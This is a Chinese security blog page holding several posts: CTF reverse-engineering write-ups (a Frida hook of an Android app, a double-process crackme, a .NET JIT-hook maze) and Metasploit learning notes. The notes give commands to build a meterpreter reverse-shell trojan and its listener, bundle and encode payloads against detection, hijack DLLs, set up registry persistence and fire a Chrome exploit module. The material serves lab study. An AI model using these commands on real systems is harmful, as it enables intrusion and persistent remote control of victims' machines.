FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            fos.write(v1_1);</span><br><span class="line">            fos.close();</span><br><span class="line">            String v8 = <span class="keyword">this</span>.getDir(<span class="string">&quot;dex&quot;</span>, <span class="number">0</span>).getAbsolutePath();</span><br><span class="line">            file.delete();</span><br><span class="line">            FlagChecker.class.getDeclaredField(<span class="string">&quot;mFlagChecker&quot;</span>).setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            FlagChecker.mFlagChecker = <span class="keyword">new</span> DexClassLoader(jarPath, v8, <span class="keyword">null</span>, <span class="keyword">this</span>.getClassLoader()).loadClass(<span class="string">&quot;com.d3ctf.noname.A&quot;</span>).newInstance();  <span class="comment">// 修改了FlagChecker的mFlagCheaker函数</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchFieldException | IllegalAccessException | IOException v0_7) &#123;</span><br><span class="line">            v0_7.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchPaddingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(InvalidKeyException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(BadPaddingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(IllegalBlockSizeException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里导入了native-lib，使用了里面的getAESKey函数，我想调试获得这个函数的值，但是程序检查flag的时候根本没运行到这里，所以要看 ida 分析 libnative-lib.so 的 getAESKey函数，不好看，而且不能调试</p>
<p>用 frida 调用 getAESKey 函数！</p>
<p>hook.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callSecretFun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.choose(<span class="string">&quot;com.d3ctf.noname.NoNameApp&quot;</span>, &#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Found instance: &quot;</span> + instance);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Result of secret func: &quot;</span> + instance.getAESKey());</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">rpc.exports = &#123;</span><br><span class="line">    callsecretfunction: callSecretFun</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>loader.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span>(<span class="params">message, payload</span>):</span></span><br><span class="line">    print(message)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.d3ctf.noname&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hook.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line">script.exports.callsecretfunction()   </span><br></pre></td></tr></table></figure>
<p>运行得到key  （frida真好用）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Script loaded successfully</span><br><span class="line">Found instance: com.d3ctf.noname.NoNameApp@c8ca7c2</span><br><span class="line">Result of secret func: -69,-68,59,-17,66,-80,104,-11,122,-112,7,-116,-64,63,121,123</span><br></pre></td></tr></table></figure>
<p>解密jar文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key = <span class="built_in">bytes</span>([<span class="number">187</span>, <span class="number">188</span>, <span class="number">59</span>, <span class="number">239</span>, <span class="number">66</span>, <span class="number">176</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">122</span>, <span class="number">144</span>, <span class="number">7</span>, <span class="number">140</span>, <span class="number">192</span>, <span class="number">63</span>, <span class="number">121</span>, <span class="number">123</span>])</span><br><span class="line">instance = AES.new(key, AES.MODE_ECB)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;D:\STUDY\reverse\ctf\noname\assets\data.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">context = f.read()</span><br><span class="line">cipher_text = instance.decrypt(context)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">r&quot;D:\STUDY\reverse\ctf\noname\data.jar&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f2.write(cipher_text)</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure>
<p>分析data.jar ，check就是个简单异或</p>
<p>有个不太懂得地方是 这个app是什么时候生成了类NoNameApp</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/17/MSF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">MSF学习笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-17</time><div class="content"><p>前言</p>
<p>最近闲得没事，学习了一下metasploit framework，做一下总结</p>
<h1 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h1><p>MSF生成 linux 木马实例</p>
<p>两个文件</p>
<p>create.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ip=192.168.114.129</span><br><span class="line">port=4444</span><br><span class="line">arch=x64</span><br><span class="line">platform=linux</span><br><span class="line">format=elf</span><br><span class="line">payload=linux/x64/meterpreter/reverse_tcp</span><br><span class="line">out=./Trojan</span><br><span class="line"></span><br><span class="line">msfvenom -p $payload LHOST=$ip LPORT=$port -f $format -a $arch --platform $platform -o $out</span><br></pre></td></tr></table></figure>
<p>listen.rc</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.114.129</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>运行 create.sh 生成木马</p>
<p>执行命令 <code>msfconsole -r ./listen.rc</code> 开始监听</p>
<p>目标靶机执行木马文件即可getshell</p>
<p>对于各种参数的取值，可以用帮助命令  <code>msfvenom -h</code>  查看</p>
<p>生成捆绑软件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-x, --template        &lt;path&gt;     Specify a custom executable file to use as a template</span><br><span class="line">-k, --keep                       Preserve the --template behaviour and inject the payload as a new thread</span><br></pre></td></tr></table></figure>




<p>生成dll类木马</p>
<p>将format的exe换成dll即可</p>
<p>dll木马原理：在加载 dl l时自动调用 dll 的 <code>DllEntryPoint</code> 函数</p>
<p>劫持正常dll：把恶意dll名称修改为正常dll的名称，在恶意dll中加载正常dll，并将所有函数调用交给正常dll执行</p>
<p>HTA：HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件</p>
<p>将format换成hta-psh即可</p>
<p>木马混淆</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-e, --encoder         &lt;encoder&gt;  The encoder to use (use --list encoders to list)</span><br><span class="line">    --service-name    &lt;value&gt;    The service name to use when generating a service binary</span><br><span class="line">    --sec-name        &lt;value&gt;    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string</span><br><span class="line">    --smallest                   Generate the smallest possible payload using all available encoders</span><br><span class="line">    --encrypt         &lt;value&gt;    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)</span><br><span class="line">    --encrypt-key     &lt;value&gt;    A key to be used for --encrypt</span><br><span class="line">    --encrypt-iv      &lt;value&gt;    An initialization vector for --encrypt</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">-i, --iterations      &lt;count&gt;    The number of times to encode the payload</span><br></pre></td></tr></table></figure>


<h1 id="管理靶机"><a href="#管理靶机" class="headerlink" title="管理靶机"></a>管理靶机</h1><p>meterpreter命令</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/haiyan123/p/8990139.html">https://www.cnblogs.com/haiyan123/p/8990139.html</a></p>
<p>网络命令补充</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp</span><br><span class="line">getproxy</span><br><span class="line">netstat 查看端口</span><br></pre></td></tr></table></figure>
<p>端口转发：转发路由器端口的流量给某个主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portwd add -l 6666 -p 3389 -r 192.168.119.145</span><br></pre></td></tr></table></figure>
<p>把192.168.119.145（靶机ip）的3389端口（windows远程桌面端口）映射到 自己的（攻击机）的 6666端口</p>
<p>作用：kali部署在服务器上，目标机在内网，自己电脑在另一个内网，那自己连kali的6666端口就是连靶机的3389端口</p>
<p>用户界面命令补充</p>
<p>keyevent  模拟键盘消息</p>
<p>mouse  模拟鼠标消息</p>
<p>权限维持</p>
<p>msf       </p>
<p>sessions 命令查看会话</p>
<p>jobs 命令查看监听</p>
<p>meterpreter</p>
<p>run persistence -h    原理修改windows注册表，使木马脚本开机自启</p>
<p>进程转移：靶机主人使用完了木马程序，然后退出了，导致连接中断。所以要提前将木马迁移到其他进程</p>
<p>meterpreter命令 migrate</p>
<h1 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h1><p>以chrome v8漏洞cve_2021_21220为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search chrome</span><br><span class="line">use exploit&#x2F;multi&#x2F;browser&#x2F;chrome_cve_2021_21220_v8_insufficient_validation</span><br><span class="line">show options</span><br><span class="line">show targets</span><br><span class="line">set target 1</span><br><span class="line">set payload payload&#x2F;windows&#x2F;x64&#x2F;exec</span><br><span class="line">set CMD calc.exe </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>


<h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><p>post模块</p>
<p>show post</p>
<p>收集靶机信息，如判断目标机是否为虚拟机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;checkvm</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/14/SangForCTF%E9%80%86%E5%90%91safe-box%E9%A2%98%E8%A7%A3/">SangForCTF逆向safe_box题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-14</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/reverse/">reverse</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E5%8F%8C%E8%BF%9B%E7%A8%8B%E5%AE%88%E6%8A%A4/">双进程守护</a></span><div class="content"><h2 id="双进程守护"><a href="#双进程守护" class="headerlink" title="双进程守护"></a>双进程守护</h2><p>ida分析这个exe，发现是一个典型的双进程守护，核心函数如下：</p>
<ul>
<li>GetModuleFileNameW： 获取当前模块的基地址</li>
<li>CreateProcessW： 以debugger模式创建一个自身副本</li>
<li>WaitForDebugEvent：调试器等待程序的DebugEvent</li>
<li>GetThreadContext：如果这个事件是调试器感兴趣的事件，就获取线程上下文 Context</li>
<li>ReadProcessMemory：读取程序的内存</li>
<li>WriteProcessMemory：修改程序的内存</li>
<li>SetThreadContext：设置程序线程的上下文</li>
<li>ContinueDebugEvent：让程序继续运行</li>
</ul>
<p>对于双进程守护，我一般有以下思路</p>
<ul>
<li>如果调试器逻辑很简单，写一个idaPython或idc脚本复原即可。这题我一开始就想这么做，但是失败了，主要是patch逻辑不太清晰，而且无法调试，出错不知道错哪里了</li>
<li>修改rip，使其自己调用patch的代码，这个思路基本没办法实现，因为寄存器和内存环境没办法匹配</li>
<li>hook api，比如 hook WriteProcessMemory，这个思路我比赛的时候没想起来</li>
<li>使程序其正常运行，然后CheatEngine看内存，比对内存进行patch，比赛时我想出了这个方法</li>
</ul>
<h2 id="safe-box-题解"><a href="#safe-box-题解" class="headerlink" title="safe box 题解"></a>safe box 题解</h2><p>本题三个关卡</p>
<p>第一个关卡由我两个可靠的队友devoke和loop解出，pwd1 == 1915969329</p>
<p>第二个关卡是个xtea变种，pwd2=S_s0_fuNny，这里我上当了</p>
<p>看如下ida伪c代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = v4 + *(_DWORD *)&amp;GWHT[<span class="number">4</span> * (v6 &amp; <span class="number">3</span>)];</span><br></pre></td></tr></table></figure>
<p>把这个伪c代码变成c代码的时候，要把中括号内的<code>4 *</code>去掉，因为数据类型变成了uint32_t[] </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint32_t GWHT[4] &#x3D; &#123;71,87,72,84&#125;;</span><br><span class="line">v8 &#x3D; v4 + str[(sum &amp; 3)]</span><br></pre></td></tr></table></figure>
<p>第三个关卡有点坑的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v9 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)&amp;input[v0 / <span class="number">4</span>]);</span><br><span class="line">  v10 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)&amp;rand_data[v0 / <span class="number">0x10</span>]);<span class="comment">// 和前4xor</span></span><br><span class="line">  v0 += <span class="number">16</span>i64;</span><br><span class="line">  rand_data[v0 / <span class="number">0x10</span> + <span class="number">9</span>] = (__int128)_mm_and_si128(</span><br><span class="line">                                         _mm_andnot_si128(_mm_and_si128(v9, v10), si128),</span><br><span class="line">                                         _mm_xor_si128(v9, v10));<span class="comment">// 本质就是xor</span></span><br><span class="line">  --v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段本质就是一个xor，通过真值表可知，式子<code>(~(a&amp;b))&amp;(a^b)</code>其实就是<code>a^b</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v11 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)v6 - <span class="number">1</span>);</span><br><span class="line">  v6 += <span class="number">32</span>;</span><br><span class="line">  v12 = _mm_and_si128(v5, v11);</span><br><span class="line">  v13 = v11;</span><br><span class="line">  v14 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)v6 - <span class="number">2</span>);</span><br><span class="line">  *(__m128i *)&amp;v6[(<span class="keyword">char</span> *)ror_data - rand_data - <span class="number">112</span>] = _mm_or_si128(</span><br><span class="line">                                                          _mm_and_si128(_mm_srl_epi32(v13, v8), si128),</span><br><span class="line">                                                          _mm_sll_epi32(v12, v9));</span><br><span class="line">  *(__m128i *)&amp;v6[(<span class="keyword">char</span> *)v99 - rand_data - <span class="number">112</span>] = _mm_or_si128(</span><br><span class="line">                                                     _mm_and_si128(_mm_srl_epi32(v14, v8), si128),</span><br><span class="line">                                                     _mm_sll_epi32(_mm_and_si128(v5, v14), v9));</span><br><span class="line">  --v10;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v10 );</span><br></pre></td></tr></table></figure>
<p>这一段本质是一个2字节的ror指令，详情略</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/13/AllesCTF2021%E9%80%86%E5%90%91Monstrosity%E9%A2%98%E8%A7%A3/">AllesCTF2021逆向Monstrosity题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-13</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/reverse/">reverse</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/c/">c#</a></span><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前学C#逆向都是不求甚解，基本只会用dnSpy反编译，这次就来 求甚解 一回</p>
<p>学习资料：《加密与解密》，<a target="_blank" rel="noopener" href="https://black-frost.github.io/posts/allesctf_2021/">https://black-frost.github.io/posts/allesctf_2021/</a></p>
<h2 id="什么是-NET"><a href="#什么是-NET" class="headerlink" title="什么是.NET"></a>什么是.NET</h2><p>什么是.NET Framework</p>
<p>由微软开发的，致力于敏捷开发、<strong>平台无关性</strong>的 软件开发平台</p>
<p>三个方面理解.NET</p>
<ul>
<li>无论程序用C++还是C#编写，程序最终编译为,NET中间语言IL</li>
<li>可执行文件不再保存机器码，而是保存IL指令和元数据</li>
<li>Windows不再负责程序的运行，而是对.NET框架进行管理，框架中的 JIT引擎 负责在运行时将IL代码即时编译为 本地汇编代码后执行</li>
</ul>
<p>更多概念</p>
<ul>
<li>Common Lanuage Runtime（简称CLR），CLR 是 IL语言的运行环境。在windows平台上，本质就是几个Ring3的DLL，如mscorwks.dll，mscorjit.dll，特点是以mscor开头</li>
<li>Just In-Time Compile 即时编译（即 JIT引擎），是.NET 运行可执行文件的基本方式</li>
<li>Metadata（元数据）是一个可执行文件的所有信息，包括一个类的所有成员信息等，为了区分各项Metadata，需要一个单独的标识，这个标识就是token，token是同一程序中区分和定位不同元数据的依据</li>
<li>Assembly，Module，Type，Method</li>
</ul>
<p>IDA打开一个C#写的程序，下面这些就是其 IL 代码</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-06/20210913154839.png"></p>
<h2 id="NET-EXE文件结构"><a href="#NET-EXE文件结构" class="headerlink" title=".NET EXE文件结构"></a>.NET EXE文件结构</h2><p>回顾Win32平台的PE结构，其中有几个Data Directory是没有被使用的，.Net对它们进行了拓展，第15项目录存储了一个偏移，这个偏移指向了EXE文件的 .text 区块，传统Win32程序 .text区块存储ASM汇编指令，.NET程序 的 .text模块有自己的结构，其结构如下</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210913185917.png"></p>
<p>Common Language Runtime头：结构和属性含义略</p>
<p>元数据：MetaData结构以一个元数据头开始（元数据头结构属性略），紧接着是几个数据流的头，头中说明了数据流的的<strong>相对偏移</strong>、大小和名称</p>
<p>.NET有以下几个常用的流</p>
<ul>
<li>#Strings ：元数据的名称</li>
<li>#Blob：程序中的非字符串数据</li>
<li>#GUID：全局唯一标识（Global Unique Identifier）</li>
<li>#US：以Unicode格式存放的 IL代码中使用的用户字符串</li>
<li>#~ ：元数据表流，几乎所有元数据信息以表的形式保存于此</li>
</ul>
<p>每个数据流也有自己的结构，在此略</p>
<p>CFF_explorer 查看 .NET 文件结构</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210913191852.png"></p>
<h2 id="IL代码"><a href="#IL代码" class="headerlink" title="IL代码"></a>IL代码</h2><ul>
<li>IL 源代码文件 拓展名为  <code>.il</code></li>
<li>注释符 <code>//</code>  ,<code>/**/</code></li>
<li>IL 源文件入口方法不一定是Main，可以用 .entrypoint 来表示</li>
<li>.assembly定义本程序集，.assembly extern定义被引用的程序集，两者分别对应元数据表中的 Assembly 和 AssemblyRef</li>
<li>mscorlib是所有.NET程序的基础，每个程序都会用它</li>
<li>本地变量（由.locals定义）可以用名称引用（ldloc val），也可以序号表示（ldloc.0）</li>
<li>IL空指令 nop 的机器码是 0x00</li>
</ul>
<p>IL语言最大的特点是以栈为基础，类似于Python的opcode</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210913193506.png"></p>
<p>IL代码与元数据结合</p>
<p>IL以元数据为操作对象，其本身又由元数据限定。Token是元数据项的唯一标识，IL通过Token来定位和引用元数据，Token实际上是一个UNIT32，形如<code>AABBBBBB</code>，<code>AA</code>标识对应表，<code>BBBBBB</code>标识表中的位置，如 Taken = 0x60000007，<code>60</code>  表示 MethodDef（也叫Method） 表，<code>000007</code> 表示 表中索引为 7的项</p>
<h2 id="NET-代码基本保护技术"><a href="#NET-代码基本保护技术" class="headerlink" title=".NET 代码基本保护技术"></a>.NET 代码基本保护技术</h2><p>强名称（类似CRC校验）：工具Strong Name Remove 把 强名称 Patch掉即可</p>
<p>名称混淆：修复名称即可</p>
<p>流程混淆（类似花指令），可以阻止 IL 代码被轻易 反编译为 C# 代码</p>
<p>压缩壳（不含MetaData加密功能），如压缩壳Sixxpack将原程序压缩后存储在新文件中，在运行时动态解压到 byte[] 数组中，核心代码如下：</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Assembly assembly1 = Assembly.Load(buffer);</span><br><span class="line">assembly1.EntryPoint.Invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>脱壳思路是 dump 目标文件</p>
<p>压缩壳（含MetaData加密功能）：</p>
<p>.NET PE文件加载过程：mscoree.dll一直存在，随后加载 mscorwks.dll ，然后是mscorlib.dll ，接着是 mscorjit.dll</p>
<p>遇到没有编译的方法时，mscorwks 调用 JIT 把代码编译成 ASM 后，将控制权交给ASM，执行完毕 mscorwks 收回控制权。大多数加密软件都以这两个dll 为突破口，进行 hook、pack操作，种种操作的目的都是 <strong>在 JIT前把被加密的 IL 代码和 Metadata 恢复正常</strong></p>
<h2 id="AllesCTF2021-Monstrosity"><a href="#AllesCTF2021-Monstrosity" class="headerlink" title="[AllesCTF2021] Monstrosity"></a>[AllesCTF2021] Monstrosity</h2><p>题目直接说明了是C++/CLI编写的，C++/CLI混合编译的程序中即可保存托管代码（IL代码），又可以保存本地代码（ASM汇编代码）</p>
<p>经典图片：</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210914123752.png"></p>
<p>用dnSpy分析这个exe，搜索main函数</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210913222355.png"></p>
<p>可以看到main函数用了类似  <code>不含MetaData加密的压缩壳</code> 的手法进行了压缩，真正的dll 藏在了 EXE文件的 resourse中，然后调用这个dll的 Maze.MazeWalker.startWalking 函数，我们利用CFF explorer 导出这个 dll</p>
<p>接下来我们分析这个dll</p>
<p>有一个10*10的迷宫，每个maze的点由MazeWalker的一个函数控制，这就是MazeWalker里100个形如visitField_x_x函数的作用，比如初始在visitField_0_0函数中，向下走一步，程序就会执行visitField_0_1函数。每次执行visitField_x_x函数之前，都会执行checkLastTransition函数，这个函数会检查你上一步走得合不合理</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210913231022.png"></p>
<p>接下来看一下maze类</p>
<p>把timestame作为seed生成的一个 maze，每一个点都有上下左右的某些Flag，联系上面的代码，这些Flag决定了哪些方向不能走</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210914140522.png"></p>
<p>回过头去看main函数，我们还有一处没有分析，main函数创建了一个线程</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210913232050.png"></p>
<p>右键点击线程入口函数，可以看到入口函数的RVA <code>0xB648</code>，我们用ida 以 PE格式打开exe，跳转到这个地址</p>
<p>这是个典型的 <strong>JIT hook</strong></p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210913233633.png"></p>
<p>跟进到sub_140001950，这个函数根据 token 修改了两个地方</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210914111356.png"></p>
<p>a3是CORINFO_METHOD_INFO结构体，可以在 <a target="_blank" rel="noopener" href="https://github.com/xoofx/ManagedJit/blob/master/ManagedJit/ManagedJit.cs#L409">https://github.com/xoofx/ManagedJit/blob/master/ManagedJit/ManagedJit.cs#L409</a> 看到它的定义，a3[2]正好指向 ILcode</p>
<blockquote>
<p>至于为什么a3是CORINFO_METHOD_INFO结构，token又是如何识别出来的，我也不太懂，应该是 getJit 函数的函数调用规则吧</p>
</blockquote>
<p>查MethodDef表可知，id为7的函数正好是 Maze.GetRandomSeed</p>
<p>我们手动 patch GetRandomSeed 的 ILcode 代码，可以得到真正运行的函数</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210914112059.png"></p>
<p>对于修改的第二个地方，可以看到他修改的是visitField_x_x函数的 <code>awsd</code> 操作码</p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210914113148.png"></p>
<p><img src="https://raw.githubusercontent.com/m0v1ng/images/master/2021-09/20210914112939.png"></p>
<p>迷宫有了，操作码有了，就可以开始解了（迷宫可以通过dnspy动态调试dump下来得到）</p>
<p>这里懒得写了，抄袭别人的脚本了</p>
